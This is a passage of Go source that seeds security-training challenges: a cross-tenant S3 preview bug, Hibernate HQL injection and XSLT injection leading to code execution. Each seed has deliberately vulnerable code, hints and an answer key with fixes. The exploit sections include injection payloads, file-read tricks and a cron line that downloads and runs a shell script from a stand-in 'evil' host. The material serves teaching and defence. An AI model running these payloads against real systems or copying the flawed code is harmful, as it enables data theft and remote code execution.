Find the bug that lets tenant A read tenant B's most sensitive
internal reports, and explain why "but the JWT is verified upstream"
does not save us.`,
		code: `import boto3
import logging
from io import BytesIO
from flask import Flask, request, jsonify, send_file

app = Flask(__name__)
logger = logging.getLogger(__name__)

s3 = boto3.client("s3")


@app.route("/api/preview", methods=["POST"])
def preview():
    body = request.get_json(force=True)
    bucket = body.get("bucket")
    key = body.get("key")
    if not bucket or not key:
        return jsonify({"error": "bucket and key required"}), 400

    tenant_id = request.headers.get("X-Tenant-Id", "unknown")
    logger.info("preview: tenant=%s bucket=%s key=%s", tenant_id, bucket, key)

    obj = s3.get_object(Bucket=bucket, Key=key)
    data = obj["Body"].read()

    return send_file(
        BytesIO(data),
        mimetype=obj.get("ContentType", "application/octet-stream"),
        download_name=key.split("/")[-1],
    )


@app.route("/api/upload", methods=["POST"])
def upload():
    tenant_id = request.headers.get("X-Tenant-Id", "unknown")
    bucket = f"tenant-{tenant_id}-uploads"
    key = request.form["key"]
    data = request.files["file"].read()
    s3.put_object(Bucket=bucket, Key=key, Body=data)
    return jsonify({"status": "uploaded", "bucket": bucket, "key": key})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)`,
		targetVuln: `A textbook confused-deputy: the worker holds permissions that
exceed the per-request authorization check.

Flaw 1 — bucket name comes from the request body (line 15).
The preview endpoint takes "bucket" straight from request.get_json().
There is no allowlist, no derivation from tenant_id, no prefix check.
The caller supplies the bucket. Combined with the next flaw, this is
the entire vulnerability.

Flaw 2 — the call uses the EC2 instance's broad IAM role (line 23).
boto3.client("s3") was constructed at import time with no
credentials argument, so it inherits the EC2 instance profile. That
profile grants s3:GetObject on tenant-specific buckets AND on
"shared-internal-reports-*" buckets. The worker is the deputy; its
authority extends well past any single tenant's data.

Why the upstream JWT does not save us:
  - The upstream proxy verified that the caller holds a valid JWT for
    some tenant_id. It did NOT verify that the caller may read the
    bucket the caller named — because the proxy has no idea what
    buckets mean in the worker's IAM policy.
  - The X-Tenant-Id header is used only for logging. Even if it were
    used for an authorization decision, the caller could spoof it
    inside the trust boundary (the proxy might not strip it).
  - Even a fully-trusted tenant_id does not constrain the bucket
    parameter. The worker still calls get_object on whatever the
    caller names.

Exploit:
  Tenant A sends:
      POST /api/preview
      Authorization: Bearer <valid JWT for tenant A>
      X-Tenant-Id: tenant-A
      Content-Type: application/json
      {"bucket": "shared-internal-reports-2024-q4",
       "key": "tenant-B/financials.pdf"}

  The worker:
    - sees a valid request,
    - calls s3.get_object on a bucket the worker has permission to read,
    - returns tenant B's financials to tenant A.

The vulnerability does not require any credential theft; the attacker
uses the worker's deputy permissions through the API surface as
designed.`,
		conceptualFix: `Two complementary fixes — both required.

1. Stop trusting caller-named buckets.
   Derive the bucket from the authenticated tenant identity, never
   from the request body:

       VALID_TENANT_BUCKETS = {tenant: f"tenant-{tenant}-uploads"
                               for tenant in known_tenants()}
       tenant_id = verify_jwt_locally(request.headers["Authorization"])
       bucket = VALID_TENANT_BUCKETS[tenant_id]   # caller cannot override

   If the endpoint must accept ANY bucket name (e.g. cross-tenant
   admin tooling), require an explicit allowlist check that consults
   the authenticated identity:

       if not is_authorized(tenant_id, bucket):
           return jsonify({"error": "forbidden"}), 403

2. Tighten the IAM role to least privilege.
   The worker should have one of:
     - per-tenant role assumption via STS AssumeRole, so the working
       credentials are bounded by the authenticated tenant; OR
     - per-resource IAM policy keyed off
       aws:PrincipalTag/tenant_id = ${s3:ExistingObjectTag/tenant_id}
       (object-tag-based authorization).
   Cross-tenant report buckets should NOT be in the same role as
   per-tenant upload buckets. Use a separate IAM role for the reports
   pipeline, and route reports access through a dedicated service
   the API surface cannot reach.

3. Defense in depth:
   - Re-verify the JWT inside the worker (don't trust an upstream
     header). Use python-jose or PyJWT with strict aud/iss checks.
   - S3 bucket policies should require sts:RequestTag/tenant_id to
     match the object's tenant tag, so even a confused deputy gets
     a deny from the bucket itself.
   - Audit CloudTrail for cross-tenant GetObject calls.`,
		hints: []string{
			"Find every value that flows from the request into an AWS API call. Which of them is the most dangerous in the hands of a malicious tenant?",
			"What permissions does boto3.client('s3') inherit when no credentials are passed? How broad is the EC2 instance role here?",
			"The upstream proxy verifies the JWT. Does verifying the JWT prove the caller may read THIS bucket, or only that the caller is some authenticated tenant?",
		},
		vulnerableLines: []int{15, 23},
	}
}

// ──────────────────────────────────────────────────
// OSCP 8 — Hibernate HQL injection via string-concatenated sort field
// Difficulty 7 — ORM-flavored SQLi that survives a casual code review.
// ──────────────────────────────────────────────────
func oscpJavaHibernateHQLInjection() challengeSeed {
	return challengeSeed{
		title:        "The ORM Mirage — Hibernate HQL Injection",
		slug:         "java-hibernate-hql-injection",
		difficulty:   7,
		langSlug:     "java",
		catSlug:      "injection",
		points:       500,
		cveReference: "CWE-89 (manifested through HQL, not raw SQL)",
		description: `An internal CRM exposes a user-search endpoint backed by a Spring
@Service that talks to PostgreSQL through Hibernate. The service is
behind admin auth, but the admin tier has 40+ analysts, including
recently onboarded contractors.

The team treats Hibernate as inherently safe ("we use the ORM, so we
can't have SQLi"). A pen test report flagged the search endpoint as
"medium" but the engineering lead pushed back: "we never call
session.createNativeQuery — only createQuery on POJO entities."

Find why the lead is wrong, and identify the smallest payload that
exfiltrates the password_hash column from the users table.`,
		code: `package com.example.usersearch;

import java.util.List;
import org.hibernate.Session;
import org.hibernate.SessionFactory;
import org.hibernate.query.Query;
import org.springframework.stereotype.Service;

@Service
public class UserSearchService {

    private final SessionFactory sessionFactory;

    public UserSearchService(SessionFactory sf) {
        this.sessionFactory = sf;
    }

    public List<UserProfile> searchByName(String name, String sortField) {
        Session session = sessionFactory.openSession();
        try {
            String hql = "FROM UserProfile u " +
                         "WHERE u.displayName LIKE '%" + name + "%' " +
                         "ORDER BY u." + sortField;
            Query<UserProfile> q = session.createQuery(hql, UserProfile.class);
            q.setMaxResults(50);
            return q.list();
        } finally {
            session.close();
        }
    }

    public UserProfile findById(Long id) {
        try (Session session = sessionFactory.openSession()) {
            Query<UserProfile> q = session.createQuery(
                "FROM UserProfile u WHERE u.id = :id", UserProfile.class);
            q.setParameter("id", id);
            return q.uniqueResult();
        }
    }
}`,
		targetVuln: `HQL injection via two concatenated user inputs in searchByName.

Line 22 — the displayName filter:
   "WHERE u.displayName LIKE '%" + name + "%' "
   The "name" parameter is concatenated into a quoted string. A
   payload of:  ' OR 1=1 OR '
   collapses the WHERE clause and dumps the entire UserProfile table.

Line 23 — the sort field:
   "ORDER BY u." + sortField
   sortField is concatenated into the ORDER BY clause. Because HQL
   permits arbitrary path expressions and supports UNION through
   subqueries on JPA entities, sortField like:
       (SELECT u2.passwordHash FROM UserProfile u2 WHERE u2.id = 1)
   uses the database's ORDER BY behavior (ordering by a computed
   value) to leak data via timing or via blind boolean conditions:
       sortField = "displayName) WHERE (1 = (CASE WHEN
                    (SELECT SUBSTRING(passwordHash, 1, 1) FROM UserProfile
                     WHERE id = 1) = 'a' THEN 1 ELSE 0 END"

Why "we use the ORM" does not save the code:
   - Hibernate's createQuery() compiles HQL into SQL. It parameterizes
     only the values you explicitly bind via setParameter() or :named
     placeholders. ANY substring you stuff into the HQL string itself
     is part of the query language, not a value. Concatenation in HQL
     is the same as concatenation in raw SQL.
   - findById on line 33-35 shows the correct pattern — :id named
     parameter. The developer knew the right way; chose the wrong way
     for searchByName.

Net effect: the "trusted internal admin" surface gives any analyst a
direct path to dump password_hash, MFA seeds, session keys, anything
that ends up as a column on a JPA entity that the search service can
see via HQL.`,
		conceptualFix: `Make every user-derived fragment a bound parameter or a
strict allowlist.

1. Bind the LIKE pattern:
       String hql = "FROM UserProfile u " +
                    "WHERE u.displayName LIKE :pattern " +
                    "ORDER BY u." + safeSortField(sortField);
       Query<UserProfile> q = session.createQuery(hql, UserProfile.class);
       q.setParameter("pattern", "%" + name + "%");
   The "%" wildcards are added to the BOUND value, not concatenated
   into the query language.

2. Allowlist the sort field. ORDER BY cannot be parameterized in JDBC
   or HQL — it is the query language, not a value. The fix is a
   compile-time set of allowed field names:

       private static final Set<String> SORT_FIELDS =
           Set.of("displayName", "createdAt", "lastLoginAt");

       private String safeSortField(String s) {
           if (!SORT_FIELDS.contains(s)) {
               throw new IllegalArgumentException("invalid sort: " + s);
           }
           return s;
       }

3. Use the Criteria API (or JPA Specification) for dynamic queries.
   The Criteria API forces all values through bound parameters and
   forces all column references through entity metamodel handles,
   which the compiler checks:

       CriteriaBuilder cb = session.getCriteriaBuilder();
       CriteriaQuery<UserProfile> cq = cb.createQuery(UserProfile.class);
       Root<UserProfile> u = cq.from(UserProfile.class);
       cq.where(cb.like(u.get("displayName"), "%" + name + "%"));
       cq.orderBy(cb.asc(u.get(safeSortField(sortField))));
       return session.createQuery(cq).setMaxResults(50).getResultList();

4. Defense in depth:
   - The search-tier DB user should have SELECT only on the columns
     the search exposes — not on password_hash, mfa_seed, etc.
   - Log HQL with abnormal subquery structure or LENGTH > N.
   - Run HQL-aware SAST (e.g. SpotBugs-FindSecBugs) in CI.`,
		hints: []string{
			"Compare searchByName with findById. The findById method uses :id — what does the searchByName method do differently?",
			"Look at every '+' operator in the searchByName method. Which operands flow from request parameters?",
			"ORDER BY in HQL cannot be a bound parameter — it must literally be a path expression. How would you safely accept user input for the sort field?",
		},
		vulnerableLines: []int{22, 23},
	}
}

// ──────────────────────────────────────────────────
// OSCP 9 — XSLT injection via lxml.etree.XSLT with attacker stylesheet
// Difficulty 8 — Custom report engine accepts user XSL → RCE via
// libxslt extension elements (exsl:document, php:function, ...).
// ──────────────────────────────────────────────────
func oscpPythonXSLTInjectionRCE() challengeSeed {
	return challengeSeed{
		title:        "The Stylesheet of Doom — XSLT Injection → RCE",
		slug:         "python-xslt-injection-rce",
		difficulty:   8,
		langSlug:     "python",
		catSlug:      "ssti",
		points:       600,
		cveReference: "CWE-91 (XML injection / XSLT)",
		description: `A Python reporting service lets enterprise customers ship custom
XSL stylesheets to render compliance reports against the day's data
snapshot. The service is deployed on Kubernetes with read-write
access to /var/lib/reports and outbound HTTPS to the corporate
artifact registry.

The team chose XSLT specifically because "it's just a templating
language — there's no eval()." The lxml library was preferred because
"it parses faster than the stdlib".

Find the vulnerability that lets a customer-supplied stylesheet escape
the templating model entirely and execute code in the worker process.`,
		code: `from flask import Flask, request, jsonify, Response
from lxml import etree

app = Flask(__name__)

REPORT_DATA = etree.parse("/var/lib/reports/snapshot.xml")


@app.route("/api/report/render", methods=["POST"])
def render_report():
    xsl_body = request.get_data(as_text=True)
    if not xsl_body:
        return jsonify({"error": "missing stylesheet"}), 400

    try:
        stylesheet_doc = etree.fromstring(xsl_body.encode("utf-8"))
        transform = etree.XSLT(stylesheet_doc)
        result = transform(REPORT_DATA)
        return Response(str(result), mimetype="application/xml")
    except etree.XSLTApplyError as e:
        return jsonify({"error": "xslt apply failed", "detail": str(e)}), 500
    except etree.XMLSyntaxError as e:
        return jsonify({"error": "xslt parse failed", "detail": str(e)}), 400


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)`,
		targetVuln: `XSLT is not "just a templating language" — it is a Turing-complete
declarative language whose libxslt implementation ships a set of
extension elements that interact with the host filesystem and process.

Flaw — etree.XSLT(stylesheet_doc) with attacker-supplied stylesheet
(lines 16-17).

The user-supplied XSL is parsed into stylesheet_doc and passed
directly to etree.XSLT() with default settings. By default lxml's
XSLT engine enables:

  - exsl:document  — writes arbitrary files to the worker's filesystem
                     (anywhere the worker user can write).
  - xsl:include / xsl:import + URI resolver — fetches stylesheets
                     over HTTP(S) and file://, enabling SSRF and
                     local-file read into the rendered output.
  - <xsl:value-of select="document('file:///etc/passwd')"/> —
                     leaks any file readable by the worker into the
                     response body.
  - php:function / dyn:evaluate (when bound) — direct code execution
                     in older libxslt builds.

Exploit (file-write → cron RCE chain):

  POST /api/report/render
  Content-Type: application/xml
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                  xmlns:exsl="http://exslt.org/common"
                  version="1.0">
    <xsl:template match="/">
      <exsl:document href="file:///var/lib/reports/../../etc/cron.d/x"
                     method="text">
* * * * * root curl https://evil/sh | sh
      </exsl:document>
    </xsl:template>
  </xsl:stylesheet>

The worker writes /etc/cron.d/x; the next minute cron executes the
shell as root.

Even without exsl:document, the document() function reads any file
the worker has access to and embeds it in the response. From a
multi-tenant standpoint that's already a critical disclosure: the
attacker reads other tenants' snapshots, /proc/self/environ
(secrets), kubelet service-account tokens, etc.`,
		conceptualFix: `XSLT cannot be safely run against attacker-supplied stylesheets
without explicit hardening. Apply the full set:

1. Pass a hardened parser and disable extensions:
       parser = etree.XMLParser(
           resolve_entities=False,   # no external entities
           no_network=True,          # no network fetches
           load_dtd=False,
       )
       stylesheet_doc = etree.fromstring(
           xsl_body.encode("utf-8"), parser=parser)

       transform = etree.XSLT(
           stylesheet_doc,
           access_control=etree.XSLTAccessControl.DENY_ALL,
       )
   XSLTAccessControl.DENY_ALL blocks file:// and http:// from the
   transform context (document(), xsl:include, xsl:import, etc.).

2. Compile and freeze stylesheets server-side.
   Treat XSLT like server code: have the security team review each
   stylesheet, sign it, and store a hash. The render endpoint accepts
   only a stylesheet ID, looks up the hash, and applies the
   pre-compiled transform. Customers never submit raw XSL at request
   time.

3. Sandbox the worker.
   Even if the XSLT engine is hardened, run the renderer with:
     - read-only filesystem (or writable only to /tmp with no setuid),
     - no network egress except to the artifact registry,
     - seccomp filter blocking execve, ptrace, mount,
     - a non-root user with no access to other tenants' snapshots.

4. Switch templating engines.
   If the requirements are "render XML data with a template" — use
   Jinja2 with autoescape, or a structured template language like
   Liquid or Mustache. They lack file/network primitives by design.`,
		hints: []string{
			"Read the lxml documentation for etree.XSLT. What does access_control default to, and what does it permit?",
			"Search for 'libxslt extension elements'. Which ones write files or fetch URLs?",
			"What does the XSLT document() function do when given a file:// URL?",
		},
		vulnerableLines: []int{16, 17},
	}
}

